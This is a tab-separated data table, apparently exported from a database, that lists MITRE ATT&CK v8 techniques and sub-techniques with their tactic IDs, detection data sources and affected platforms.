T1053	Scheduled Task/Job	\N	\N	T1053	TA0002,TA0003,TA0004	\N	{"File monitoring","Process monitoring","Process command-line parameters","Windows event logs"}	'Windows', 'Linux', 'macOS', 'Containers'	ATT&CK v8
T1134	Access Token Manipulation	\N	\N	T1134	TA0005,TA0004	\N	{"Authentication logs","Windows event logs","API monitoring","Access tokens","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1071	Application Layer Protocol	\N	\N	T1071	TA0011	\N	{"DNS records","Network protocol analysis","Packet capture","Netflow/Enclave netflow","Process use of network","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1071	Application Layer Protocol	T1071.001	Web Protocols	T1071.001	TA0011	\N	{"Network protocol analysis","Process monitoring","Process use of network","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1021	Remote Services	T1021.006	Windows Remote Management	T1021.006	TA0008	\N	{"Process command-line parameters","Process monitoring","Netflow/Enclave netflow","Authentication logs","File monitoring"}	'Windows'	ATT&CK v8
T1091	Replication Through Removable Media	\N	\N	T1091	TA0001,TA0008	\N	{"File monitoring","Data loss prevention"}	'Windows'	ATT&CK v8
T1053	Scheduled Task/Job	T1053.004	Launchd	T1053.004	TA0002,TA0003,TA0004	\N	{"Process command-line parameters","File monitoring","Process monitoring"}	'macOS'	ATT&CK v8
T1053	Scheduled Task/Job	T1053.006	Systemd Timers	T1053.006	TA0002,TA0003,TA0004	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux'	ATT&CK v8
T1064	Scripting	\N	\N	T1064	TA0005,TA0002	\N	{"Process monitoring","File monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1593	Search Open Websites/Domains	T1593.001	Social Media	T1593.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1505	Server Software Component	T1505.001	SQL Stored Procedures	T1505.001	TA0003	\N	{"Application logs"}	'Windows', 'Linux'	ATT&CK v8
T1505	Server Software Component	T1505.003	Web Shell	T1505.003	TA0003	\N	{"Process monitoring","Netflow/Enclave netflow","File monitoring","Authentication logs"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1051	Shared Webroot	\N	\N	T1051	TA0008	\N	{"File monitoring","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.004	InstallUtil	T1218.004	TA0005	\N	{"Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.007	Msiexec	T1218.007	TA0005	\N	{"DLL monitoring","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.010	Regsvr32	T1218.010	TA0005	\N	{"Windows Registry","Process command-line parameters","Process monitoring","Loaded DLLs"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.012	Verclsid	T1218.012	TA0005	\N	{"Process use of network","Process command-line parameters","Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1072	Software Deployment Tools	\N	\N	T1072	TA0002,TA0008	\N	{"Authentication logs","File monitoring","Third-party application logs","Windows Registry","Process monitoring","Process use of network","Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1518	Software Discovery	\N	\N	T1518	TA0007	\N	{"Stackdriver logs","Azure activity logs","AWS CloudTrail logs","Process command-line parameters","Process monitoring","File monitoring"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1558	Steal or Forge Kerberos Tickets	T1558.001	Golden Ticket	T1558.001	TA0006	\N	{"Authentication logs","Windows event logs"}	'Windows'	ATT&CK v8
T1558	Steal or Forge Kerberos Tickets	T1558.004	AS-REP Roasting	T1558.004	TA0006	\N	{"Windows event logs","Authentication logs"}	'Windows'	ATT&CK v8
T1553	Subvert Trust Controls	\N	\N	T1553	TA0005	\N	{"Binary file metadata","File monitoring","Process command-line parameters","Process monitoring","API monitoring","Application logs","DLL monitoring","Loaded DLLs","Windows Registry","Windows event logs"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1553	Subvert Trust Controls	T1553.003	SIP and Trust Provider Hijacking	T1553.003	TA0005	\N	{"Windows Registry","API monitoring","Application logs","DLL monitoring","Loaded DLLs","Process monitoring","Windows Registry","Windows event logs"}	'Windows'	ATT&CK v8
T1082	System Information Discovery	\N	\N	T1082	TA0007	\N	{"Azure activity logs","Stackdriver logs","AWS CloudTrail logs","Process monitoring","Process command-line parameters"}	'Windows', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1033	System Owner/User Discovery	\N	\N	T1033	TA0007	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1569	System Services	\N	\N	T1569	TA0002	\N	{"Windows Registry","Process command-line parameters","Process monitoring","File monitoring"}	'Windows', 'macOS'	ATT&CK v8
T1569	System Services	T1569.001	Launchctl	T1569.001	TA0002	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'macOS'	ATT&CK v8
T1221	Template Injection	\N	\N	T1221	TA0005	\N	{Anti-virus,"Email gateway","Network intrusion detection system","Web logs"}	'Windows'	ATT&CK v8
T1127	Trusted Developer Utilities Proxy Execution	T1127.001	MSBuild	T1127.001	TA0005	\N	{"Process monitoring"}	'Windows'	ATT&CK v8
T1111	Two-Factor Authentication Interception	\N	\N	T1111	TA0006	\N	{"API monitoring","Process monitoring","Kernel drivers"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1552	Unsecured Credentials	T1552.002	Credentials in Registry	T1552.002	TA0006	\N	{"Process command-line parameters","Process monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1550	Use Alternate Authentication Material	T1550.004	Web Session Cookie	T1550.004	TA0005,TA0008	\N	{"Office 365 audit logs","Authentication logs"}	'Office 365', 'SaaS', 'Google Workspace'	ATT&CK v8
T1204	User Execution	T1204.002	Malicious File	T1204.002	TA0002	\N	{Anti-virus,"Process command-line parameters","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1078	Valid Accounts	T1078.004	Cloud Accounts	T1078.004	TA0005,TA0001,TA0003,TA0004	\N	{"Azure activity logs","Authentication logs","AWS CloudTrail logs","Stackdriver logs"}	'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Google Workspace'	ATT&CK v8
T1497	Virtualization/Sandbox Evasion	T1497.001	System Checks	T1497.001	TA0005,TA0007	\N	{"Process command-line parameters","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1102	Web Service	T1102.002	Bidirectional Communication	T1102.002	TA0011	\N	{"Host network interface","Netflow/Enclave netflow","Network protocol analysis","Packet capture","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1548	Abuse Elevation Control Mechanism	T1548.001	Setuid and Setgid	T1548.001	TA0005,TA0004		{"File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.002	Authentication Package	T1547.002	TA0003,TA0004	\N	{"DLL monitoring","Windows Registry","Loaded DLLs"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.012	Print Processors	T1547.012	TA0003,TA0004	\N	{"Process monitoring","Windows Registry","File monitoring","DLL monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1059	Command and Scripting Interpreter	\N	\N	T1059	TA0002	\N	{"Windows event logs","PowerShell logs","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.005	Visual Basic	T1059.005	TA0002	\N	{"DLL monitoring","Loaded DLLs","File monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1043	Commonly Used Port	\N	\N	T1043	TA0011	\N	{"Packet capture","Netflow/Enclave netflow","Process use of network","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1543	Create or Modify System Process	\N	\N	T1543	TA0003,TA0004	\N	{"Windows event logs","Windows Registry","File monitoring","Process command-line parameters","Process monitoring"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1555	Credentials from Password Stores	\N	\N	T1555	TA0006	\N	{"PowerShell logs","API monitoring","File monitoring","Process monitoring","System calls"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1482	Domain Trust Discovery	\N	\N	T1482	TA0007	\N	{"PowerShell logs","API monitoring","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1189	Drive-by Compromise	\N	\N	T1189	TA0001	\N	{"Packet capture","Network device logs","Process use of network","Web proxy","Network intrusion detection system","SSL/TLS inspection"}	'Windows', 'Linux', 'macOS', 'SaaS'	ATT&CK v8
T1546	Event Triggered Execution	T1546.008	Accessibility Features	T1546.008	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","File monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1546	Event Triggered Execution	T1546.012	Image File Execution Options Injection	T1546.012	TA0003,TA0004	\N	{"API monitoring","Windows event logs","Windows Registry","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1048	Exfiltration Over Alternative Protocol	T1048.003	Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol	T1048.003	TA0010	\N	{"Network protocol analysis","Netflow/Enclave netflow","Packet capture","Process use of network"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1052	Exfiltration Over Physical Medium	T1052.001	Exfiltration over USB	T1052.001	TA0010	\N	{"Process monitoring","Data loss prevention","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1567	Exfiltration Over Web Service	\N	\N	T1567	TA0010	\N	{"Process monitoring","Process use of network","Packet capture","Netflow/Enclave netflow","Network protocol analysis","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1567	Exfiltration Over Web Service	T1567.002	Exfiltration to Cloud Storage	T1567.002	TA0010	\N	{"Process monitoring","Process use of network","Packet capture","Netflow/Enclave netflow","Network protocol analysis","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1061	Graphical User Interface	\N	\N	T1061	TA0002	\N	{"File monitoring","Process monitoring","Process command-line parameters","Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.007	Path Interception by PATH Environment Variable	T1574.007	TA0005,TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1574	Hijack Execution Flow	T1574.012	COR_PROFILER	T1574.012	TA0005,TA0003,TA0004	\N	{"Windows Registry","File monitoring","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1562	Impair Defenses	T1562.003	Impair Command History Logging	T1562.003	TA0005	\N	{"PowerShell logs","Process command-line parameters","Environment variable","File monitoring","Authentication logs","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1578	Modify Cloud Compute Infrastructure	T1578.003	Delete Cloud Instance	T1578.003	TA0005	\N	{"GCP audit logs","Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1027	Obfuscated Files or Information	\N	\N	T1027	TA0005	\N	{"Network protocol analysis","Process use of network","File monitoring","Malware reverse engineering","Binary file metadata","Process command-line parameters","Environment variable","Process monitoring","Windows event logs","Network intrusion detection system","Email gateway","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1588	Obtain Capabilities	T1588.004	Digital Certificates	T1588.004	TA0042	\N	{"SSL/TLS certificates"}	'PRE'	ATT&CK v8
T1137	Office Application Startup	\N	\N	T1137	TA0003	\N	{"Mail server","Process monitoring","Process command-line parameters","Windows Registry","File monitoring"}	'Windows', 'Office 365'	ATT&CK v8
T1572	Protocol Tunneling	\N	\N	T1572	TA0011	\N	{"Network protocol analysis","Process monitoring","Process use of network","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1021	Remote Services	T1021.002	SMB/Windows Admin Shares	T1021.002	TA0008	\N	{"Process command-line parameters","Process monitoring","Authentication logs","Process use of network"}	'Windows'	ATT&CK v8
T1021	Remote Services	T1021.003	Distributed Component Object Model	T1021.003	TA0008	\N	{"Windows event logs","Windows Registry","Process monitoring","Packet capture","DLL monitoring","Authentication logs","API monitoring","PowerShell logs"}	'Windows'	ATT&CK v8
T1199	Trusted Relationship	\N	\N	T1199	TA0001	\N	{"Azure activity logs","Stackdriver logs","AWS CloudTrail logs","Application logs","Authentication logs","Third-party application logs"}	'Windows', 'SaaS', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1497	Virtualization/Sandbox Evasion	T1497.002	User Activity Based Checks	T1497.002	TA0005,TA0007	\N	{"Process command-line parameters","Process use of network"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1102	Web Service	\N	\N	T1102	TA0011	\N	{"Host network interface","Netflow/Enclave netflow","Network protocol analysis","Packet capture","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1548	Abuse Elevation Control Mechanism			T1548	TA0005,TA0004		{"Windows Registry","File monitoring","Process command-line parameters","API monitoring","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1548	Abuse Elevation Control Mechanism	T1548.002	Bypass User Account Control	T1548.002	TA0005,TA0004		{"Windows Registry","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1548	Abuse Elevation Control Mechanism	T1548.003	Sudo and Sudo Caching	T1548.003	TA0005,TA0004	#ff6666	{"File monitoring","Process command-line parameters"}	'Linux', 'macOS'	ATT&CK v8
T1548	Abuse Elevation Control Mechanism	T1548.004	Elevated Execution with Prompt	T1548.004	TA0005,TA0004	\N	{"API monitoring","Process monitoring","File monitoring"}	'macOS'	ATT&CK v8
T1134	Access Token Manipulation	T1134.002	Create Process with Token	T1134.002	TA0005,TA0004	\N	{"Process command-line parameters","Process monitoring","Access tokens","API monitoring"}	'Windows'	ATT&CK v8
T1134	Access Token Manipulation	T1134.003	Make and Impersonate Token	T1134.003	TA0005,TA0004	\N	{"Process command-line parameters","Process monitoring","Access tokens","API monitoring"}	'Windows'	ATT&CK v8
T1087	Account Discovery	\N	\N	T1087	TA0007	\N	{"Azure activity logs","Office 365 account logs","API monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1098	Account Manipulation	T1098.001	Additional Cloud Credentials	T1098.001	TA0003	\N	{"Stackdriver logs","GCP audit logs","AWS CloudTrail logs","Azure activity logs"}	'IaaS', 'Azure AD'	ATT&CK v8
T1071	Application Layer Protocol	T1071.002	File Transfer Protocols	T1071.002	TA0011	\N	{"Network protocol analysis","Process monitoring","Process use of network","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1071	Application Layer Protocol	T1071.003	Mail Protocols	T1071.003	TA0011	\N	{"Network protocol analysis","Process monitoring","Process use of network","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1020	Automated Exfiltration	\N	\N	T1020	TA0010	\N	{"File monitoring","Process monitoring","Process use of network"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.003	Time Providers	T1547.003	TA0003,TA0004	\N	{"API monitoring","Binary file metadata","DLL monitoring","File monitoring","Loaded DLLs","Process monitoring"}	'Windows'	ATT&CK v8
T1547	Boot or Logon Autostart Execution	T1547.004	Winlogon Helper DLL	T1547.004	TA0003,TA0004	\N	{"Windows Registry","File monitoring","Process monitoring"}	'Windows'	ATT&CK v8
T1037	Boot or Logon Initialization Scripts	T1037.002	Logon Script (Mac)	T1037.002	TA0003,TA0004	\N	{"Process monitoring","File monitoring"}	'macOS'	ATT&CK v8
T1176	Browser Extensions	\N	\N	T1176	TA0003	\N	{"Windows Registry","File monitoring","Process use of network","Process monitoring","Browser extensions"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1110	Brute Force	T1110.002	Password Cracking	T1110.002	TA0006	\N	{"Authentication logs","Office 365 account logs"}	'Linux', 'macOS', 'Windows', 'Office 365', 'Azure AD'	ATT&CK v8
T1110	Brute Force	T1110.003	Password Spraying	T1110.003	TA0006	\N	{"Authentication logs","Office 365 account logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1538	Cloud Service Dashboard	\N	\N	T1538	TA0007	\N	{"Office 365 audit logs","Azure activity logs","Stackdriver logs","AWS CloudTrail logs"}	'Azure AD', 'Office 365', 'IaaS', 'Google Workspace'	ATT&CK v8
T1059	Command and Scripting Interpreter	T1059.006	Python	T1059.006	TA0002	\N	{"System calls","Process monitoring","Process command-line parameters","API monitoring"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1092	Communication Through Removable Media	\N	\N	T1092	TA0011	\N	{"File monitoring","Data loss prevention"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1136	Create Account	T1136.003	Cloud Account	T1136.003	TA0003	\N	{"Office 365 audit logs","Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'Azure AD', 'Office 365', 'IaaS', 'Google Workspace'	ATT&CK v8
T1543	Create or Modify System Process	T1543.002	Systemd Service	T1543.002	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Linux'	ATT&CK v8
T1543	Create or Modify System Process	T1543.003	Windows Service	T1543.003	TA0003,TA0004	\N	{"API monitoring","Windows event logs","Process command-line parameters","Process monitoring","File monitoring","Windows Registry"}	'Windows'	ATT&CK v8
T1132	Data Encoding	T1132.001	Standard Encoding	T1132.001	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1565	Data Manipulation	T1565.002	Transmitted Data Manipulation	T1565.002	TA0040	\N	{"Packet capture","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1001	Data Obfuscation	T1001.003	Protocol Impersonation	T1001.003	TA0011	\N	{"Packet capture","Process use of network","Process monitoring","Network protocol analysis"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1070	Indicator Removal on Host	T1070.001	Clear Windows Event Logs	T1070.001	TA0005	\N	{"API monitoring","Process command-line parameters","Process monitoring","File monitoring"}	'Windows'	ATT&CK v8
T1578	Modify Cloud Compute Infrastructure	T1578.002	Create Cloud Instance	T1578.002	TA0005	\N	{"GCP audit logs","Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1137	Office Application Startup	T1137.003	Outlook Forms	T1137.003	TA0003	\N	{"Mail server","Process command-line parameters","Process monitoring"}	'Windows', 'Office 365'	ATT&CK v8
T1055	Process Injection	T1055.005	Thread Local Storage	T1055.005	TA0005,TA0004	\N	{"Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1018	Remote System Discovery	\N	\N	T1018	TA0007	\N	{"Network protocol analysis","Process monitoring","Process use of network","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	\N	\N	T1218	TA0005	\N	{"API monitoring","File monitoring","Binary file metadata","Process use of network","Windows Registry","Loaded DLLs","DLL monitoring","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1553	Subvert Trust Controls	T1553.004	Install Root Certificate	T1553.004	TA0005	\N	{"SSL/TLS inspection","Digital certificate logs"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1074	Data Staged	T1074.001	Local Data Staging	T1074.001	TA0009	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1213	Data from Information Repositories	T1213.002	Sharepoint	T1213.002	TA0009	\N	{"Office 365 audit logs","Authentication logs","Application logs"}	'Windows', 'Office 365'	ATT&CK v8
T1140	Deobfuscate/Decode Files or Information	\N	\N	T1140	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'Linux', 'macOS'	ATT&CK v8
T1561	Disk Wipe	\N	\N	T1561	TA0040	\N	{"Kernel drivers","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1568	Dynamic Resolution	T1568.002	Domain Generation Algorithms	T1568.002	TA0011	\N	{"DNS records","Netflow/Enclave netflow","Network device logs","Packet capture","Process use of network"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1114	Email Collection	\N	\N	T1114	TA0009	\N	{"Office 365 trace logs","Mail server","Email gateway","Authentication logs","File monitoring","Process monitoring","Process use of network"}	'Windows', 'Office 365', 'Google Workspace'	ATT&CK v8
T1499	Endpoint Denial of Service	\N	\N	T1499	TA0040	\N	{"SSL/TLS inspection","Web logs","Web application firewall logs","Network intrusion detection system","Network protocol analysis","Network device logs","Netflow/Enclave netflow"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1499	Endpoint Denial of Service	T1499.002	Service Exhaustion Flood	T1499.002	TA0040	\N	{"Netflow/Enclave netflow","Network device logs","Network intrusion detection system","Web application firewall logs","Web logs","SSL/TLS inspection"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1546	Event Triggered Execution	T1546.007	Netsh Helper DLL	T1546.007	TA0003,TA0004	\N	{"Process command-line parameters","Process monitoring","Windows Registry","DLL monitoring"}	'Windows'	ATT&CK v8
T1048	Exfiltration Over Alternative Protocol	\N	\N	T1048	TA0010	\N	{"Process monitoring","Process use of network","Packet capture","Netflow/Enclave netflow","Network protocol analysis"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1048	Exfiltration Over Alternative Protocol	T1048.001	Exfiltration Over Symmetric Encrypted Non-C2 Protocol	T1048.001	TA0010	\N	{"Malware reverse engineering","Network protocol analysis","Netflow/Enclave netflow","Packet capture","Process use of network"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1048	Exfiltration Over Alternative Protocol	T1048.002	Exfiltration Over Asymmetric Encrypted Non-C2 Protocol	T1048.002	TA0010	\N	{"Network protocol analysis","Netflow/Enclave netflow","Packet capture","Process use of network"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1190	Exploit Public-Facing Application	\N	\N	T1190	TA0001	\N	{"Azure activity logs","AWS CloudTrail logs","Stackdriver logs","Packet capture","Web logs","Web application firewall logs","Application logs"}	'Windows', 'IaaS', 'Network', 'Linux', 'macOS', 'Containers'	ATT&CK v8
T1222	File and Directory Permissions Modification	\N	\N	T1222	TA0005	\N	{"File monitoring","Process monitoring","Process command-line parameters","Windows event logs"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1591	Gather Victim Org Information	T1591.001	Determine Physical Locations	T1591.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1564	Hide Artifacts	T1564.001	Hidden Files and Directories	T1564.001	TA0005	\N	{"Process command-line parameters","Process monitoring","File monitoring"}	'Windows', 'macOS', 'Linux'	ATT&CK v8
T1564	Hide Artifacts	T1564.006	Run Virtual Instance	T1564.006	TA0005	\N	{"Packet capture","Host network interface","Windows Registry","File monitoring","Process monitoring","Process command-line parameters"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1195	Supply Chain Compromise	T1195.001	Compromise Software Dependencies and Development Tools	T1195.001	TA0001	\N	{"File monitoring","Web proxy"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1562	Impair Defenses	\N	\N	T1562	TA0005	\N	{"GCP audit logs","Azure activity logs","AWS CloudTrail logs",Anti-virus,Services,"API monitoring","Environment variable","Authentication logs","File monitoring","Process command-line parameters","Process monitoring","Windows Registry"}	'Windows', 'Office 365', 'IaaS', 'Linux', 'macOS', 'Containers'	ATT&CK v8
T1562	Impair Defenses	T1562.001	Disable or Modify Tools	T1562.001	TA0005	\N	{"Process command-line parameters","Windows Registry",Services,"File monitoring"}	'Windows', 'macOS', 'Linux', 'Containers', 'IaaS'	ATT&CK v8
T1070	Indicator Removal on Host	T1070.003	Clear Command History	T1070.003	TA0005	\N	{"Process command-line parameters","PowerShell logs","File monitoring","Authentication logs"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1070	Indicator Removal on Host	T1070.004	File Deletion	T1070.004	TA0005	\N	{"Binary file metadata","Process command-line parameters","File monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1056	Input Capture	\N	\N	T1056	TA0009,TA0006	\N	{"Windows Registry","Windows event logs","User interface","Process command-line parameters","Process monitoring","PowerShell logs","Loaded DLLs","Kernel drivers","DLL monitoring","Binary file metadata","API monitoring"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1557	Man-in-the-Middle	T1557.002	ARP Cache Poisoning	T1557.002	TA0009,TA0006	\N	{"Packet capture","Netflow/Enclave netflow"}	'Linux', 'Windows', 'macOS'	ATT&CK v8
T1556	Modify Authentication Process	\N	\N	T1556	TA0006,TA0005,TA0003	\N	{"File monitoring","Authentication logs","API monitoring","Windows Registry","Process monitoring","DLL monitoring"}	'Windows', 'Linux', 'macOS', 'Network'	ATT&CK v8
T1578	Modify Cloud Compute Infrastructure	T1578.001	Create Snapshot	T1578.001	TA0005	\N	{"GCP audit logs","Stackdriver logs","Azure activity logs","AWS CloudTrail logs"}	'IaaS'	ATT&CK v8
T1599	Network Boundary Bridging	T1599.001	Network Address Translation Traversal	T1599.001	TA0005	\N	{"Netflow/Enclave netflow","Packet capture"}	'Network'	ATT&CK v8
T1498	Network Denial of Service	\N	\N	T1498	TA0040	\N	{"Sensor health and status","Network protocol analysis","Netflow/Enclave netflow","Network intrusion detection system","Network device logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1498	Network Denial of Service	T1498.001	Direct Network Flood	T1498.001	TA0040	\N	{"Sensor health and status","Network protocol analysis","Netflow/Enclave netflow","Network intrusion detection system","Network device logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1498	Network Denial of Service	T1498.002	Reflection Amplification	T1498.002	TA0040	\N	{"Sensor health and status","Network protocol analysis","Netflow/Enclave netflow","Network intrusion detection system","Network device logs"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1027	Obfuscated Files or Information	T1027.005	Indicator Removal from Tools	T1027.005	TA0005	\N	{"Process monitoring","Process command-line parameters",Anti-virus,"Binary file metadata"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1137	Office Application Startup	T1137.006	Add-ins	T1137.006	TA0003	\N	{"Process command-line parameters","File monitoring","Windows Registry","Process monitoring"}	'Windows', 'Office 365'	ATT&CK v8
T1069	Permission Groups Discovery	\N	\N	T1069	TA0007	\N	{"Stackdriver logs","GCP audit logs","AWS CloudTrail logs","Azure activity logs","Office 365 account logs","API monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1566	Phishing	\N	\N	T1566	TA0001	\N	{"File monitoring","Packet capture","Web proxy","Email gateway","Mail server","Network intrusion detection system","Detonation chamber","SSL/TLS inspection",Anti-virus}	'Linux', 'macOS', 'Windows', 'SaaS', 'Office 365', 'Google Workspace'	ATT&CK v8
T1542	Pre-OS Boot	T1542.005	TFTP Boot	T1542.005	TA0005,TA0003	\N	{"Network device run-time memory","Network device command history","Network device configuration","File monitoring","Network device logs"}	'Network'	ATT&CK v8
T1055	Process Injection	T1055.003	Thread Execution Hijacking	T1055.003	TA0005,TA0004	\N	{"Process monitoring","API monitoring"}	'Windows'	ATT&CK v8
T1090	Proxy	T1090.002	External Proxy	T1090.002	TA0011	\N	{"Process use of network","Process monitoring","Network protocol analysis","Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1108	Redundant Access	\N	\N	T1108	TA0005,TA0003	\N	{"Office 365 account logs","Azure activity logs","AWS CloudTrail logs","Stackdriver logs","Process monitoring","Process use of network","Packet capture","Network protocol analysis","File monitoring","Authentication logs","Binary file metadata"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS'	ATT&CK v8
T1021	Remote Services	\N	\N	T1021	TA0008	\N	{"Windows Registry","Windows event logs","Process use of network","Process monitoring","Process command-line parameters","PowerShell logs","Packet capture","Network protocol analysis","Netflow/Enclave netflow","File monitoring","DLL monitoring","Authentication logs","API monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1021	Remote Services	T1021.004	SSH	T1021.004	TA0008	\N	{"Authentication logs","Process use of network","Network protocol analysis","Netflow/Enclave netflow"}	'Linux', 'macOS'	ATT&CK v8
T1053	Scheduled Task/Job	T1053.002	At (Windows)	T1053.002	TA0002,TA0003,TA0004	\N	{"File monitoring","Process command-line parameters","Process monitoring","Windows event logs"}	'Windows'	ATT&CK v8
T1597	Search Closed Sources	T1597.001	Threat Intel Vendors	T1597.001	TA0043	\N	\N	'PRE'	ATT&CK v8
T1596	Search Open Technical Databases	T1596.005	Scan Databases	T1596.005	TA0043	\N	\N	'PRE'	ATT&CK v8
